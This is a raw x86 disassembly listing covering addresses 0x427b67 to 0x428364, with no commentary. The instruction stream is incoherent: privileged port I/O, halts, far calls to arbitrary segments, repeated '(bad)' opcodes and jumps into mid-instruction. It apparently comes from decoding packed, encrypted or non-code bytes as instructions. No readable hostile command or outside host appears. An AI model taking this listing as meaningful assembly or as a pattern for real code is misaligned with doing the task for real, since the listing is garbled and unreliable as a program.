  427b67:	sub    al,0x49
  427b69:	pusha  
  427b6a:	rol    BYTE PTR [esi+0x14],0xf4
  427b6e:	lock xchg edi,esp
  427b71:	add    bh,BYTE PTR [edx+0x42e30314]
  427b77:	cs pushf 
  427b79:	add    eax,0x4db9929a
  427b7e:	lods   eax,DWORD PTR ds:[esi]
  427b7f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b80:	bound  esp,QWORD PTR [ebx+0x3662356d]
  427b86:	fmul   QWORD PTR [esi+eiz*1-0x2085c5d0]
  427b8d:	test   DWORD PTR [ebx+edi*8-0x68],esp
  427b91:	leave  
  427b92:	push   ds
  427b93:	aam    0x5e
  427b95:	pop    ebx
  427b96:	ss mov esi,0xb66a51b
  427b9c:	mov    DWORD PTR [ecx+0x3d82439e],esp
  427ba2:	sub    eax,0x4b84cb43
  427ba7:	pushf  
  427ba8:	mov    eax,DWORD PTR [ebp*2-0x762c8d7c]
  427baf:	xor    al,0x14
  427bb1:	and    eax,0x3559d95d
  427bb6:	sahf   
  427bb7:	xor    dh,BYTE PTR [eax-0x66acde10]
  427bbd:	add    ecx,DWORD PTR [edx+0x7a1bf55e]
  427bc3:	fs xchg esi,eax
  427bc5:	cli    
  427bc6:	xchg   esi,eax
  427bc7:	lods   al,BYTE PTR ds:[esi]
  427bc8:	sti    
  427bc9:	mov    ds:0xdd88dcd2,eax
  427bce:	out    0xbc,eax
  427bd0:	and    edi,esi
  427bd2:	fdivr  QWORD PTR [ecx+0x3b6205a1]
  427bd8:	clc    
  427bd9:	mov    edi,0xcfbd334d
  427bde:	pusha  
  427bdf:	arpl   WORD PTR [edi+0x74d2bc55],si
  427be5:	xchg   edi,eax
  427be6:	inc    esp
  427be7:	aad    0xac
  427be9:	hlt    
  427bea:	shr    DWORD PTR [ebx],0xa3
  427bed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bee:	cdq    
  427bef:	(bad)  
  427bf0:	mov    es,WORD PTR [edi]
  427bf2:	cmp    DWORD PTR ds:0x4790da0,0xffffff94
  427bf9:	mov    ebx,0x9da7ab5e
  427bfe:	das    
  427bff:	mov    bh,0xdd
  427c01:	gs fwait
  427c03:	jmp    0x9d89:0x213e73f4
  427c0a:	push   0xc37c898a
  427c0f:	xchg   ecx,eax
  427c10:	rol    DWORD PTR [edx],0x1a
  427c13:	and    BYTE PTR [edx+0x703b0687],ah
  427c19:	retf   
  427c1a:	pop    ds
  427c1b:	addr16 push eax
  427c1d:	and    ecx,DWORD PTR [ebx+0x23]
  427c20:	inc    ecx
  427c21:	adc    DWORD PTR [edi],0xffffffc0
  427c24:	and    BYTE PTR [edi],al
  427c26:	mov    dl,0xd5
  427c28:	jnp    0x427c7c
  427c2a:	dec    ebp
  427c2b:	jbe    0x427c5b
  427c2d:	mov    bh,0xee
  427c2f:	sub    DWORD PTR [edx+0x6ce7d541],eax
  427c35:	mov    ecx,0x8c1e7c1f
  427c3a:	js     0x427c10
  427c3c:	(bad)  
  427c3d:	jle    0x427bfd
  427c3f:	xchg   ecx,eax
  427c40:	mov    al,ds:0xf46c0750
  427c45:	jmp    0x427c26
  427c47:	pop    ebx
  427c48:	test   BYTE PTR ds:0xe404efff,al
  427c4e:	push   0xfffffff9
  427c50:	mov    cl,0x2
  427c52:	cwde   
  427c53:	mov    DWORD PTR [ebp-0x6b],esp
  427c56:	lahf   
  427c57:	and    ch,0x15
  427c5a:	push   ds
  427c5b:	jmp    0x427c25
  427c5d:	fnsave [edx]
  427c5f:	nop
  427c60:	and    eax,0x2c6c0511
  427c65:	pop    edx
  427c66:	push   cs
  427c67:	aam    0x91
  427c69:	xor    DWORD PTR [edx+0x1f],ecx
  427c6c:	cmp    esi,ebx
  427c6e:	pusha  
  427c6f:	inc    ebx
  427c70:	mov    al,ds:0x9e325bc3
  427c75:	adc    eax,0xb1299966
  427c7a:	pop    edx
  427c7b:	sub    cl,BYTE PTR [esi+0x7c]
  427c7e:	shl    BYTE PTR [edi-0xb3b63a0],0x83
  427c85:	adc    bl,BYTE PTR [edi]
  427c87:	jns    0x427cf6
  427c89:	mov    eax,0x5fbc623a
  427c8e:	xchg   esp,eax
  427c8f:	aam    0x1e
  427c91:	call   0x3c62:0xcfb978d4
  427c98:	mov    BYTE PTR [ecx-0x80],dh
  427c9b:	lods   al,BYTE PTR ds:[esi]
  427c9c:	adc    al,ch
  427c9e:	jl     0x427c34
  427ca0:	unpckhps xmm2,XMMWORD PTR [ecx+edi*1+0x6a]
  427ca5:	in     al,dx
  427ca6:	mov    esi,DWORD PTR [ebp-0x67b55b7e]
  427cac:	(bad)  
  427cad:	iret   
  427cae:	call   0x8db5:0xf788ff2a
  427cb5:	aas    
  427cb6:	mov    al,0x6d
  427cb8:	add    al,0x90
  427cba:	icebp  
  427cbb:	mov    ds:0x5560fcd1,eax
  427cc0:	push   ebp
  427cc1:	inc    esi
  427cc2:	xlat   BYTE PTR ds:[ebx]
  427cc3:	sub    ecx,DWORD PTR [eax+0x50b07cf3]
  427cc9:	outs   dx,BYTE PTR ds:[esi]
  427cca:	mov    al,ds:0xa417c952
  427ccf:	push   edx
  427cd0:	cmp    BYTE PTR [ecx+0x7a11b5a2],ah
  427cd6:	lods   al,BYTE PTR ds:[esi]
  427cd7:	xlat   BYTE PTR ds:[ebx]
  427cd8:	pop    ecx
  427cda:	and    eax,0x14aa71ae
  427ce0:	xor    al,0x5e
  427ce2:	(bad)  
  427ce3:	aad    0xbc
  427ce5:	out    0xb0,al
  427ce7:	shl    BYTE PTR [esi-0x6b],1
  427cea:	mov    es,eax
  427cec:	mov    DWORD PTR ds:0xc0c729dc,edi
  427cf2:	cmp    DWORD PTR [esi-0x7],edi
  427cf5:	add    ah,BYTE PTR [ebx+eax*1]
  427cf8:	sti    
  427cf9:	icebp  
  427cfa:	adc    DWORD PTR [edi-0x18],0xb6471f79
  427d01:	mov    dh,BYTE PTR [eax-0x78]
  427d04:	dec    eax
  427d05:	outs   dx,DWORD PTR ds:[esi]
  427d06:	push   es
  427d07:	aam    0x65
  427d09:	mov    esp,0x37d1d804
  427d0e:	sti    
  427d0f:	xchg   ebx,eax
  427d10:	cld    
  427d11:	cmc    
  427d12:	and    BYTE PTR [edx-0x6a30a633],bh
  427d18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427d19:	outs   dx,DWORD PTR ds:[esi]
  427d1a:	out    dx,al
  427d1b:	push   eax
  427d1c:	mov    WORD PTR [edx],es
  427d1e:	inc    eax
  427d1f:	or     eax,0x98f1fdc6
  427d24:	outs   dx,DWORD PTR ds:[esi]
  427d25:	xor    DWORD PTR [ebx],eax
  427d27:	adc    DWORD PTR [edi+0x14492567],ebx
  427d2d:	add    BYTE PTR [edx+edx*4],dl
  427d30:	mov    eax,ds:0x558ee758
  427d35:	add    dh,BYTE PTR [eax+0x46]
  427d38:	and    dl,BYTE PTR [ecx+0x5]
  427d3b:	xchg   edi,eax
  427d3c:	jge    0x427d0c
  427d3e:	pusha  
  427d3f:	pop    ecx
  427d40:	xor    dl,0xc
  427d43:	pusha  
  427d44:	in     eax,0x78
  427d46:	(bad)  
  427d47:	cmc    
  427d48:	repz add dh,BYTE PTR [esi-0x7b33c485]
  427d4f:	sahf   
  427d50:	or     eax,ecx
  427d52:	pop    ds
  427d53:	and    eax,0x90933867
  427d58:	call   0x658f:0xd48d28
  427d5f:	mov    al,ds:0xc6dcdd0
  427d64:	mov    DWORD PTR [ebp+0x40],eax
  427d67:	out    dx,al
  427d68:	int3   
  427d69:	xchg   edi,eax
  427d6a:	jg     0x427dc2
  427d6c:	out    dx,ax
  427d6e:	push   edx
  427d6f:	mov    ebx,0xc288565a
  427d74:	pop    es
  427d75:	test   BYTE PTR [edi+0x1cf81714],al
  427d7b:	and    edi,DWORD PTR [ebp-0x1a]
  427d7e:	pop    ds
  427d7f:	xchg   edi,eax
  427d80:	dec    esi
  427d81:	ret    
  427d82:	dec    ecx
  427d83:	lahf   
  427d84:	xor    bl,BYTE PTR [eax]
  427d86:	aam    0xd5
  427d88:	inc    edx
  427d89:	or     edi,ebx
  427d8b:	cmp    ebp,0x88b15b44
  427d91:	inc    ebx
  427d92:	scas   al,BYTE PTR es:[edi]
  427d93:	push   esp
  427d94:	jg     0x427e08
  427d96:	rcr    DWORD PTR [ebp+0x7dd41c39],cl
  427d9c:	ret    
  427d9d:	mov    ch,0x48
  427d9f:	lock cmp BYTE PTR [ebx-0x76],al
  427da3:	lock cmp BYTE PTR fs:[edi+0x50],bl
  427da8:	out    dx,eax
  427da9:	sub    ebx,DWORD PTR [edi]
  427dab:	inc    ecx
  427dac:	cwde   
  427dad:	imul   edi,DWORD PTR [ebp+0x17e423e5],0xa05eca6c
  427db7:	aam    0xde
  427db9:	das    
  427dba:	pusha  
  427dbb:	and    dh,BYTE PTR [ebp+ecx*4+0x6d]
  427dbf:	sbb    eax,0x7899aa98
  427dc4:	out    dx,al
  427dc5:	ret    
  427dc6:	pop    esi
  427dc7:	gs sahf 
  427dc9:	mov    ah,0x3b
  427dcb:	stos   BYTE PTR es:[edi],al
  427dcc:	sub    BYTE PTR [ebx+0x14],ah
  427dcf:	nop
  427dd0:	mov    dl,0x45
  427dd2:	mov    al,ds:0x9672b4a9
  427dd7:	test   DWORD PTR [esi+0x4c565d05],0x3b23ef90
  427de1:	sbb    eax,0xa8e6ebe
  427de6:	xlat   BYTE PTR ds:[ebx]
  427de7:	loope  0x427db2
  427de9:	sub    dh,al
  427deb:	push   eax
  427dec:	imul   eax,eax,0x1a5eed1f
  427df2:	xor    dh,ah
  427df4:	dec    esi
  427df5:	jnp    0x427e44
  427df7:	lods   eax,DWORD PTR ds:[esi]
  427df8:	sbb    al,0x15
  427dfa:	inc    ebp
  427dfb:	inc    ecx
  427dfc:	rol    DWORD PTR ds:0xf1c39d9b,1
  427e02:	jg     0x427e5e
  427e04:	mov    DWORD PTR [ecx],edi
  427e06:	push   ebx
  427e07:	fisub  WORD PTR [ebx-0x7c]
  427e0a:	pushf  
  427e0b:	(bad)  
  427e0c:	stos   BYTE PTR es:[edi],al
  427e0d:	rcl    BYTE PTR es:[edx-0x2],0xb9
  427e12:	pusha  
  427e13:	mov    BYTE PTR [ebp+0x32],dh
  427e16:	fbld   TBYTE PTR [eax]
  427e18:	mov    DWORD PTR [edi+0x4ad78f87],esi
  427e1e:	(bad)
  427e21:	dec    ebp
  427e22:	mov    edx,0x5c033cb0
  427e27:	add    ch,BYTE PTR [edx-0x760ed8e5]
  427e2d:	mov    ebx,0x1d72657f
  427e32:	ror    BYTE PTR [ebp-0x2a5c084a],cl
  427e38:	push   ebx
  427e39:	add    al,0x90
  427e3b:	aas    
  427e3c:	xchg   esp,eax
  427e3d:	xlat   BYTE PTR ds:[ebx]
  427e3e:	and    ah,ah
  427e40:	mov    BYTE PTR [edi-0x5e58e959],bl
  427e46:	pop    ecx
  427e47:	jns    0x427e56
  427e49:	add    esp,DWORD PTR [eax+edx*4+0x26652633]
  427e50:	push   ecx
  427e51:	neg    BYTE PTR [edi]
  427e53:	add    DWORD PTR [ecx],esi
  427e55:	and    dl,ch
  427e57:	outs   dx,BYTE PTR ds:[esi]
  427e58:	mov    dh,0xef
  427e5a:	inc    ebp
  427e5b:	aam    0x40
  427e5d:	mov    al,0x1
  427e5f:	xchg   ebx,eax
  427e60:	xor    bl,BYTE PTR [edx]
  427e62:	mov    bl,0x7c
  427e64:	cli    
  427e65:	(bad)  
  427e66:	jno    0x427e39
  427e68:	xor    esp,ebp
  427e6a:	jp     0x427e69
  427e6c:	aad    0x5
  427e6e:	jg     0x427e82
  427e70:	sub    ah,bh
  427e72:	leave  
  427e73:	imul   DWORD PTR [ecx+0x46]
  427e76:	xchg   esi,eax
  427e77:	(bad)  
  427e79:	inc    edi
  427e7a:	adc    dh,bh
  427e7c:	mov    ecx,0xd7e5e717
  427e81:	or     bl,0x99
  427e84:	test   BYTE PTR [edx],bl
  427e86:	dec    edi
  427e87:	mov    al,ds:0xceff8b86
  427e8c:	outs   dx,BYTE PTR ds:[esi]
  427e8d:	retf   0xe89f
  427e90:	and    ah,dl
  427e92:	dec    ebx
  427e93:	aam    0xb9
  427e95:	jae    0x427e3b
  427e97:	pusha  
  427e98:	pushf  
  427e99:	add    eax,0x8b49c9b9
  427e9e:	call   0x88fb:0xef5acbc3
  427ea5:	push   edi
  427ea6:	sbb    BYTE PTR [edx-0x1a],ch
  427ea9:	adc    DWORD PTR [edi],0x361420ba
  427eaf:	fmulp  st(0),st
  427eb1:	xchg   esp,eax
  427eb2:	cmc    
  427eb3:	repz cmp eax,esi
  427eb6:	fwait
  427eb7:	adc    esp,edx
  427eb9:	add    bl,ah
  427ebb:	cwde   
  427ebc:	icebp  
  427ebd:	push   cs
  427ebe:	loope  0x427f31
  427ec0:	add    eax,0x66bce81c
  427ec5:	je     0x427eb4
  427ec7:	mov    ecx,0xbf542099
  427ecc:	mov    BYTE PTR [edi+0x15d40be5],ah
  427ed2:	and    al,0xf5
  427ed4:	jle    0x427ed8
  427ed6:	inc    esi
  427ed7:	add    eax,0x723bc41e
  427edc:	popf   
  427edd:	pop    esi
  427ede:	add    BYTE PTR [eax+ecx*4+0x2b],cl
  427ee2:	inc    esp
  427ee3:	shr    esp,cl
  427ee5:	add    DWORD PTR [edi],esi
  427ee7:	hlt    
  427ee8:	scas   eax,DWORD PTR es:[edi]
  427ee9:	push   ds
  427eea:	enter  0x96d8,0xc6
  427eee:	push   es
  427eef:	mov    edi,0xbf76f548
  427ef4:	mov    DWORD PTR [edi+0x33b97a9a],eax
  427efa:	(bad)  
  427efb:	mov    ch,0x3f
  427efd:	add    ah,BYTE PTR [ebp+edi*1+0x2ca19bc9]
  427f04:	fcmovnbe st,st(2)
  427f06:	pusha  
  427f07:	adc    DWORD PTR [edx-0x2f],ebp
  427f0a:	lods   eax,DWORD PTR ds:[esi]
  427f0b:	xchg   BYTE PTR [esi+0x61],al
  427f0e:	cdq    
  427f0f:	aam    0xfc
  427f11:	adc    eax,edx
  427f13:	jecxz  0x427f50
  427f15:	mov    ebp,DWORD PTR [ecx]
  427f17:	bound  ecx,QWORD PTR [ecx+0x16098dc9]
  427f1d:	pop    ecx
  427f1e:	aad    0xa4
  427f20:	add    DWORD PTR ds:0x5886359c,0x4a
  427f27:	lahf   
  427f28:	mov    cl,0x97
  427f2a:	pop    ds
  427f2b:	imul   DWORD PTR [edi+0x2c042926]
  427f31:	lds    esi,FWORD PTR [ecx+0x3a5714d4]
  427f37:	aaa    
  427f38:	es push esi
  427f3a:	xor    edi,DWORD PTR [ebp-0x6b722e78]
  427f40:	shr    BYTE PTR [edx-0x708ee524],1
  427f46:	lds    esp,FWORD PTR [ebp+0x244fd889]
  427f4c:	cmc    
  427f4d:	clc    
  427f4e:	mov    dl,BYTE PTR ds:0x9fa47588
  427f54:	pusha  
  427f55:	mov    ds:0x2b3f27a,eax
  427f5a:	jbe    0x427f35
  427f5c:	rcr    BYTE PTR [esi+0x44d03a98],cl
  427f62:	push   ds
  427f63:	(bad)  
  427f64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427f65:	push   cs
  427f66:	dec    edx
  427f67:	mov    ecx,edx
  427f69:	xor    DWORD PTR [ecx+0x583f48d4],ebx
  427f6f:	adc    ah,BYTE PTR [edi]
  427f71:	(bad)  
  427f72:	shr    dh,cl
  427f74:	mov    BYTE PTR [ecx+0x1d4c9c33],dl
  427f7a:	add    dh,bh
  427f7c:	outs   dx,BYTE PTR ds:[esi]
  427f7d:	add    ecx,DWORD PTR [eax+0x4c5653a1]
  427f83:	fisub  DWORD PTR [esi+0x71]
  427f86:	pop    ss
  427f87:	fmul   DWORD PTR [ecx+0x289043ab]
  427f8d:	cmp    ch,BYTE PTR [edi]
  427f8f:	in     al,0x85
  427f91:	adc    al,bh
  427f93:	dec    edx
  427f94:	xchg   esp,eax
  427f95:	loope  0x427ff7
  427f97:	pop    ebx
  427f98:	test   DWORD PTR [edi],eax
  427f9a:	in     al,dx
  427f9b:	ins    BYTE PTR es:[edi],dx
  427f9c:	mov    BYTE PTR [edi],dl
  427f9e:	adc    eax,0xb1557183
  427fa3:	pop    eax
  427fa4:	out    dx,al
  427fa5:	adc    al,0x4a
  427fa7:	push   esp
  427fa8:	adc    BYTE PTR [esi-0x2f],bl
  427fab:	xor    eax,0x43181633
  427fb0:	mov    DWORD PTR [ebp+0x52eb71fc],edi
  427fb6:	call   0x2ada:0xc21cfd02
  427fbd:	pop    ecx
  427fbe:	pusha  
  427fbf:	stos   BYTE PTR es:[edi],al
  427fc0:	push   0x899601dd
  427fc5:	xchg   ecx,eax
  427fc6:	dec    edx
  427fc7:	in     al,0xaf
  427fc9:	mov    dh,0x7e
  427fcb:	stos   BYTE PTR es:[edi],al
  427fcc:	ror    DWORD PTR [eax+0x34],0xbc
  427fd0:	into   
  427fd1:	add    edi,esp
  427fd3:	jb     0x428054
  427fd5:	cmp    al,0xde
  427fd7:	add    DWORD PTR [esi+eax*1],esp
  427fda:	pusha  
  427fdb:	pop    ss
  427fdc:	pop    ds
  427fdd:	mov    BYTE PTR [ebp-0x17],dl
  427fe0:	call   0xb72c:0x97d3d11c
  427fe7:	cwde   
  427fe8:	jae    0x42805b
  427fea:	into   
  427feb:	fs sbb esp,ebp
  427fee:	pusha  
  427fef:	lahf   
  427ff0:	loop   0x428023
  427ff2:	mov    al,ds:0x48429847
  427ff7:	aad    0x38
  427ff9:	inc    esi
  427ffa:	push   edi
  427ffb:	pop    edx
  427ffc:	cmp    BYTE PTR ds:0xb0b94d98,dh
  428002:	pusha  
  428003:	aad    0x26
  428005:	imul   esi,DWORD PTR [eax+0x62],0xd45d4d7c
  42800c:	aaa    
  42800d:	into   
  42800e:	xchg   ebx,eax
  42800f:	retf   0xd681
  428012:	iret   
  428013:	enter  0x1988,0xaf
  428017:	xchg   esi,eax
  428018:	cli    
  428019:	adc    DWORD PTR [ecx+0x34],edx
  42801c:	mov    ah,0x5
  42801e:	mov    dh,0x5b
  428020:	push   es
  428021:	or     edi,DWORD PTR [eax+0x27]
  428024:	inc    edi
  428025:	pusha  
  428026:	ud2    
  428028:	mov    BYTE PTR [ebx],ah
  42802a:	daa    
  42802b:	cmp    bh,0x51
  42802e:	pop    ecx
  42802f:	call   DWORD PTR [edi]
  428031:	add    dl,BYTE PTR [eax+0x40]
  428034:	adc    eax,0x46dbd1c
  428039:	sbb    eax,0x7ad9497c
  42803e:	in     eax,0x95
  428040:	adc    DWORD PTR [esi+0x29803187],0x54d669f2
  42804a:	jmp    0x92c8597a
  42804f:	xchg   BYTE PTR ds:0x887a40b8,dh
  428055:	pop    ebx
  428056:	cwde   
  428057:	adc    BYTE PTR [ebp-0x438a1ff3],al
  42805d:	int    0xf5
  42805f:	xor    DWORD PTR [ebp+ecx*4-0x3fd85f28],0xffffffb3
  428067:	pop    eax
  428068:	mov    BYTE PTR [edx+esi*4-0xd],bh
  42806c:	outs   dx,BYTE PTR ds:[esi]
  42806d:	loop   0x42805a
  42806f:	aaa    
  428070:	mov    BYTE PTR [ebx],bh
  428072:	inc    esi
  428073:	shr    BYTE PTR ds:0x5ecd8e8c,cl
  428079:	(bad)  
  42807b:	rcr    ecx,1
  42807d:	adc    eax,0xedec07f5
  428082:	and    DWORD PTR [edi+0xb5c62df],eax
  428088:	mov    DWORD PTR [ebx-0x10],eax
  42808b:	jnp    0x4280ec
  42808d:	(bad)  
  42808e:	jno    0x4280f8
  428090:	fs push ds
  428092:	add    dl,bh
  428094:	cmp    dh,bl
  428096:	add    BYTE PTR ds:0x2420da96,ch
  42809c:	fnstenv [edi-0x70]
  42809f:	mov    ch,0x8b
  4280a1:	sbb    ebx,ebp
  4280a3:	xchg   ebx,eax
  4280a4:	aam    0x58
  4280a6:	test   al,0x32
  4280a8:	pop    esi
  4280a9:	add    cl,BYTE PTR [ebx]
  4280ab:	inc    esp
  4280ac:	dec    edx
  4280ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4280ae:	call   0xb814:0x1702d819
  4280b5:	cs push 0x862704cf
  4280bb:	(bad)  
  4280bc:	mov    eax,ds:0xe1ec5f54
  4280c1:	jno    0x428115
  4280c3:	xchg   ecx,eax
  4280c4:	xchg   edi,eax
  4280c5:	test   eax,0x420ed7d0
  4280ca:	pop    esi
  4280cb:	icebp  
  4280cc:	jecxz  0x428055
  4280ce:	sub    esi,edi
  4280d0:	sbb    DWORD PTR [ebx],eax
  4280d2:	lods   al,BYTE PTR ds:[esi]
  4280d3:	sbb    BYTE PTR [esi],bl
  4280d5:	add    eax,0xdd07aea3
  4280da:	mov    esi,DWORD PTR fs:[edx]
  4280dd:	jmp    0x571d:0x8331f7c7
  4280e4:	out    0xf6,al
  4280e6:	adc    bl,bl
  4280e8:	inc    BYTE PTR ds:0x5872f22a
  4280ee:	cmc    
  4280ef:	push   esi
  4280f0:	ret    0x1f91
  4280f3:	xor    DWORD PTR [eax],ebp
  4280f5:	clc    
  4280f6:	mov    al,0xb9
  4280f8:	sbb    al,0x1b
  4280fa:	pop    edi
  4280fb:	aad    0xb5
  4280fd:	cwde   
  4280fe:	dec    edx
  4280ff:	jbe    0x428093
  428101:	and    BYTE PTR [eax+0x47],ch
  428104:	mov    BYTE PTR [edi+0x3047ebc2],al
  42810a:	xor    esp,esp
  42810c:	add    DWORD PTR ds:0xb67922e0,0xcce9950b
  428116:	call   0x3b68:0x4175eaf1
  42811d:	test   BYTE PTR [eax-0x9],ah
  428120:	add    al,0x8a
  428122:	loopne 0x42813c
  428124:	out    0xf3,al
  428126:	scas   eax,DWORD PTR es:[edi]
  428127:	mov    ds:0x8d76fc95,eax
  42812c:	mov    DWORD PTR [ebp+0x43],esp
  42812f:	jecxz  0x42817b
  428131:	or     DWORD PTR [edi],ebx
  428133:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  428135:	mov    bh,0x8d
  428137:	outs   dx,BYTE PTR ds:[esi]
  428138:	inc    esi
  428139:	(bad)  
  42813b:	aad    0xfc
  42813d:	and    ebp,DWORD PTR [ebx-0x13ccd33f]
  428143:	test   DWORD PTR [eax+0xc1860f5],0x3da684f0
  42814d:	add    esi,DWORD PTR [esi+0x25]
  428150:	loopne 0x428131
  428152:	fcomip st,st(3)
  428154:	jle    0x4280e6
  428156:	xchg   ebx,eax
  428157:	sti    
  428158:	mov    DWORD PTR [esi],edx
  42815a:	shr    DWORD PTR [esi-0x2bdc8584],1
  428160:	rcl    BYTE PTR [ecx],cl
  428162:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428163:	and    eax,0xb30fa62f
  428168:	mov    BYTE PTR [edi-0x4c2b9ac4],bh
  42816e:	sbb    al,0x13
  428170:	cmp    BYTE PTR [ebx],al
  428172:	and    al,0x67
  428174:	xchg   edi,eax
  428175:	in     al,0x88
  428177:	jae    0x428160
  428179:	push   ecx
  42817a:	push   ds
  42817b:	shl    DWORD PTR [esi-0x51],1
  42817e:	push   ebx
  42817f:	mov    ds:0xd44108a4,al
  428184:	mov    esp,DWORD PTR [edx-0xe]
  428187:	push   esi
  428188:	xor    BYTE PTR [eax-0x479449b],ah
  42818e:	sbb    BYTE PTR [ebp+0x2dfedbba],dl
  428194:	jecxz  0x428193
  428196:	loopne 0x4281c2
  428198:	xchg   DWORD PTR [esi-0x53],eax
  42819b:	pop    eax
  42819c:	or     BYTE PTR [ebp+0x11bda1f],bh
  4281a2:	nop
  4281a3:	int    0xa1
  4281a5:	mov    ds,WORD PTR [ebp-0x61]
  4281a8:	lahf   
  4281a9:	aad    0xc8
  4281ab:	repnz xchg edi,eax
  4281ad:	adc    al,0x3a
  4281af:	sbb    eax,0xb8c04b2f
  4281b4:	fwait
  4281b5:	jnp    0x428156
  4281b7:	je     0x428234
  4281b9:	add    eax,DWORD PTR [edx]
  4281bb:	fnsetpm(287 only) 
  4281bd:	push   ebp
  4281be:	enter  0x1203,0x61
  4281c2:	mov    ebx,0x1f815d3d
  4281c7:	mov    ebp,0xa2714d42
  4281cc:	fild   DWORD PTR ds:0xd0a8fd40
  4281d2:	add    dh,bl
  4281d4:	mov    gs,WORD PTR [ebx-0x1d6d20e1]
  4281da:	push   0x41
  4281dc:	add    ch,ah
  4281de:	sbb    al,0xe8
  4281e0:	mov    cl,0x5a
  4281e2:	pop    esp
  4281e3:	scas   eax,DWORD PTR es:[edi]
  4281e4:	xlat   BYTE PTR ds:[ebx]
  4281e5:	pop    ss
  4281e6:	or     bh,dh
  4281e8:	mov    esp,DWORD PTR [ebp-0x154c3a32]
  4281ee:	pop    ds
  4281ef:	dec    ecx
  4281f0:	cmp    dh,cl
  4281f2:	dec    ebp
  4281f3:	xor    al,ah
  4281f5:	pop    ebp
  4281f6:	jp     0x4281cd
  4281f8:	sub    DWORD PTR [ebp+0x30fccb69],0x9b89bbfc
  428202:	push   eax
  428203:	lods   eax,DWORD PTR ds:[esi]
  428204:	sti    
  428205:	mov    BYTE PTR [eax+0x7e023ad7],bl
  42820b:	inc    edx
  42820c:	mov    dl,0x58
  42820e:	adc    eax,0x11c68626
  428213:	or     BYTE PTR [eax-0x1530d61b],0x19
  42821a:	jl     0x428280
  42821c:	stos   DWORD PTR es:[edi],eax
  42821d:	add    dh,dl
  42821f:	dec    ecx
  428220:	add    BYTE PTR [edi+eax*2],cl
  428223:	fdiv   DWORD PTR [ebp-0x580ce067]
  428229:	jmp    DWORD PTR [esi-0xa]
  42822c:	nop
  42822d:	jge    0x428255
  42822f:	xlat   BYTE PTR ds:[ebx]
  428230:	pop    esi
  428231:	mov    esi,0x76e675e0
  428236:	jns    0x42821f
  428238:	mov    BYTE PTR [ebp-0x17],al
  42823b:	cmp    al,0xce
  42823d:	in     al,0x6b
  42823f:	mov    ecx,0xd58d62a6
  428244:	in     eax,0xf5
  428246:	mov    BYTE PTR [ecx],ah
  428248:	push   ss
  428249:	and    eax,0x55acc8e6
  42824e:	mov    ch,0x8f
  428250:	(bad)  
  428251:	xchg   ebx,eax
  428252:	mov    WORD PTR [esi+0x46c100bc],ss
  428258:	call   0x66f0093c
  42825d:	cmp    DWORD PTR [ebp-0x6f],edi
  428260:	test   eax,0xb91bdf05
  428265:	pop    ds
  428266:	pop    edx
  428267:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428268:	mov    esp,0xdfa51665
  42826d:	push   es
  42826e:	bound  esi,QWORD PTR [ebx]
  428270:	loop   0x4282b4
  428272:	pop    ds
  428273:	inc    edi
  428274:	in     eax,0x73
  428276:	push   ss
  428277:	mov    edx,0xd2e600e5
  42827c:	setae  BYTE PTR [edx-0x37]
  428280:	cs loop 0x4282a3
  428283:	sbb    BYTE PTR [eax+0x98f66b5],dh
  428289:	cmp    BYTE PTR [edx+0x58],0x11
  42828d:	inc    ebx
  42828e:	dec    esi
  42828f:	inc    edi
  428290:	mov    BYTE PTR [edx+0x1e],cl
  428293:	jno    0x43c6c0d7
  428299:	jmp    0x2af74fbd
  42829e:	enter  0xa215,0x1d
  4282a2:	jl     0x428278
  4282a4:	scas   al,BYTE PTR es:[edi]
  4282a5:	cmp    DWORD PTR [ebp+0x24],ebx
  4282a8:	scas   al,BYTE PTR es:[edi]
  4282a9:	or     BYTE PTR [ecx-0x57],dl
  4282ac:	mov    ebx,esp
  4282ae:	mov    BYTE PTR [edx-0x50b83f8b],0xf2
  4282b5:	sti    
  4282b6:	and    eax,0x3e25c3ac
  4282bb:	ret    
  4282bc:	xchg   edi,eax
  4282bd:	add    dl,BYTE PTR [edi-0x50]
  4282c0:	xchg   ebp,eax
  4282c1:	mov    dl,0x60
  4282c3:	loope  0x4282f2
  4282c5:	ins    BYTE PTR es:[edi],dx
  4282c6:	mov    cl,0x93
  4282c8:	into   
  4282c9:	adc    DWORD PTR [esp+edx*8+0x36],esp
  4282cd:	shr    BYTE PTR [edx-0x5e6b3e7c],1
  4282d3:	xrelease mov DWORD PTR [ebx+0x5397b0ab],ecx
  4282da:	fist   WORD PTR [edx+esi*2-0x12768dfd]
  4282e1:	push   ebp
  4282e2:	xor    BYTE PTR [edi+esi*8-0x4bb0e0f9],ah
  4282e9:	jae    0x4282c8
  4282eb:	enter  0x42f2,0xcd
  4282ef:	frstor [edx+0x3c]
  4282f2:	push   ss
  4282f3:	in     eax,0x52
  4282f5:	add    edi,DWORD PTR [edx-0x52]
  4282f8:	mov    eax,0x882399bd
  4282fd:	and    esi,DWORD PTR ds:0xe6ab5cc6
  428303:	aas    
  428304:	mov    ds:0x79ee8e02,al
  428309:	mov    esi,0x57236815
  42830e:	gs daa 
  428310:	fild   DWORD PTR [edi+0x37]
  428313:	out    dx,eax
  428314:	ret    0x5d37
  428317:	aam    0xde
  428319:	retf   
  42831a:	(bad)  
  42831b:	cwde   
  42831c:	sbb    DWORD PTR [edi+0x14],eax
  42831f:	pop    esi
  428320:	in     eax,dx
  428321:	test   DWORD PTR [edi-0x12c7235a],esp
  428327:	inc    esi
  428328:	mov    BYTE PTR [edi-0x308b7b1e],bl
  42832e:	mov    dl,0x8a
  428330:	rol    BYTE PTR ds:0x7dfc59ea,cl
  428336:	and    eax,0xaccbcad2
  42833b:	popa   
  42833c:	repnz jmp 0x776e:0xa784999c
  428344:	sub    dh,BYTE PTR [ebp+0x1e]
  428347:	inc    ebp
  428348:	push   esi
  428349:	push   esp
  42834a:	jle    0x428321
  42834c:	mov    ds:0x5a17b789,al
  428351:	stos   BYTE PTR es:[edi],al
  428352:	test   BYTE PTR [ebp+0x5fe02989],0xad
  428359:	fdiv   DWORD PTR [eax]
  42835b:	jp     0x428336
  42835d:	cmp    ch,BYTE PTR [esi+ebp*4-0x1e9b3434]
  428364:	adc    BYTE PTR [eax],0x76
